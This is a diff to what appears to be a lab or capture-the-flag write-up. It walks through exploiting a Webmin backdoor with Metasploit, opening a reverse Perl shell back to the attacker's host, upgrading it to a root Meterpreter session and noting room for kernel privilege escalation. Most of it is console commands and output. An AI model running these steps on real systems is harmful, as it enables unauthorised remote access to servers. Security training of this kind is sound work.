@@ -188,6 +188,169 @@ Matching Modules
 Interact with a module by name or index. For example info 0, use 0 or use exploit/linux/http/webmin_backdoor
 ```
 
-- We can then setup the exploit with the options for the victim server
+- We can then setup the exploit with the options for the victim server and run the exploit
 
+
+```
+msf6 > use 0
+[*] Using configured payload cmd/unix/reverse_perl
+msf6 exploit(linux/http/webmin_backdoor) > show options
+
+Module options (exploit/linux/http/webmin_backdoor):
+
+   Name       Current Setting  Required  Description
+   ----       ---------------  --------  -----------
+   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT      10000            yes       The target port (TCP)
+   SRVHOST    0.0.0.0          yes       The local host or network interface to listen on. This must be an address on the local machine or 0.0.0.0 to listen on all addresses.
+   SRVPORT    8080             yes       The local port to listen on.
+   SSL        false            no        Negotiate SSL/TLS for outgoing connections
+   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
+   TARGETURI  /                yes       Base path to Webmin
+   URIPATH                     no        The URI to use for this exploit (default is random)
+   VHOST                       no        HTTP server virtual host
+
+
+Payload options (cmd/unix/reverse_perl):
+
+   Name   Current Setting  Required  Description
+   ----   ---------------  --------  -----------
+   LHOST                   yes       The listen address (an interface may be specified)
+   LPORT  4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   0   Automatic (Unix In-Memory)
+
+
+
+View the full module info with the info, or info -d command.
+
+msf6 exploit(linux/http/webmin_backdoor) > set RHOSTS 10.1.26.30
+RHOSTS => 10.1.26.30
+msf6 exploit(linux/http/webmin_backdoor) > set SSL true
+[!] Changing the SSL option's value may require changing RPORT!
+SSL => true
+msf6 exploit(linux/http/webmin_backdoor) > set LHOST 10.1.26.20
+LHOST => 10.1.26.20
+msf6 exploit(linux/http/webmin_backdoor) > run
+
+[*] Started reverse TCP handler on 10.1.26.20:4444
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target is vulnerable.
+[*] Configuring Automatic (Unix In-Memory) target
+[*] Sending cmd/unix/reverse_perl command payload
+[*] Command shell session 2 opened (10.1.26.20:4444 -> 10.1.26.30:52474) at 2023-03-06 13:52:36 +0000
+```
+
+- This gives us a shell on the server, granted not the best shell in the world
+
+```
+[*] Sending cmd/unix/reverse_perl command payload
+[*] Command shell session 2 opened (10.1.26.20:4444 -> 10.1.26.30:52474) at 2023-03-06 13:52:36 +0000
+
+ls
+JSON
+LICENCE
+LICENCE.ja
+README
+WebminCore.pm
+WebminUI
+```
+
+### Upgrading the shell
+
+- To make this shell more usable we can utilise the metsploit feature meterperter shell
+
+```
+^Z
+Background session 2? [y/N]  y
+msf6 exploit(linux/http/webmin_backdoor) > search shell_to_meterpreter
+
+Matching Modules
+================
+
+   #  Name                                    Disclosure Date  Rank    Check  Description
+   -  ----                                    ---------------  ----    -----  -----------
+   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade
+
+
+Interact with a module by name or index. For example info 0, use 0 or use post/multi/manage/shell_to_meterpreter
+
+msf6 exploit(linux/http/webmin_backdoor) > use 0
+```
+
+```
+msf6 post(multi/manage/shell_to_meterpreter) > show options
+
+Module options (post/multi/manage/shell_to_meterpreter):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
+   LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
+   LPORT    4433             yes       Port for payload to connect to.
+   SESSION                   yes       The session to run this module on
+
+
+View the full module info with the info, or info -d command.
+
+msf6 post(multi/manage/shell_to_meterpreter) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type            Information  Connection
+  --  ----  ----            -----------  ----------
+  1         shell cmd/unix               10.1.26.20:4444 -> 10.1.26.30:52472 (10.1.26.30)
+  2         shell cmd/unix               10.1.26.20:4444 -> 10.1.26.30:52474 (10.1.26.30)
+
+msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 2
+SESSION => 2
+msf6 post(multi/manage/shell_to_meterpreter) > run
+
+[*] Upgrading session ID: 2
+[*] Starting exploit/multi/handler
+[*] Started reverse TCP handler on 10.1.26.20:4433
+[*] Sending stage (1017704 bytes) to 10.1.26.30
+[*] Meterpreter session 3 opened (10.1.26.20:4433 -> 10.1.26.30:51376) at 2023-03-06 13:58:30 +0000
+[*] Command stager progress: 100.00% (773/773 bytes)
+[*] Post module execution completed
+```
+
+```
+msf6 post(multi/manage/shell_to_meterpreter) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                   Information            Connection
+  --  ----  ----                   -----------            ----------
+  1         shell cmd/unix                                10.1.26.20:4444 -> 10.1.26.30:52472 (10.1.26.30)
+  2         shell cmd/unix                                10.1.26.20:4444 -> 10.1.26.30:52474 (10.1.26.30)
+  3         meterpreter x86/linux  root @ 192.168.130.34  10.1.26.20:4433 -> 10.1.26.30:51376 (10.1.26.30)
+
+msf6 post(multi/manage/shell_to_meterpreter) > sessions 3
+[*] Starting interaction with 3...
+
+meterpreter >
+```
+
+- We now have a meterpreter shell!
+- Running sysinfo shows us we have a Ubuntu 16.04 box running with an old linux kernel - this could open some doors for a kernel exploit priv esc
+- Also note we arent on amd64
+
+```
+meterpreter > sysinfo
+Computer     : 192.168.130.34
+OS           : Ubuntu 16.04 (Linux 4.4.0-210-generic)
+Architecture : i686
+BuildTuple   : i486-linux-musl
+Meterpreter  : x86/linux
+meterpreter >
+```
 
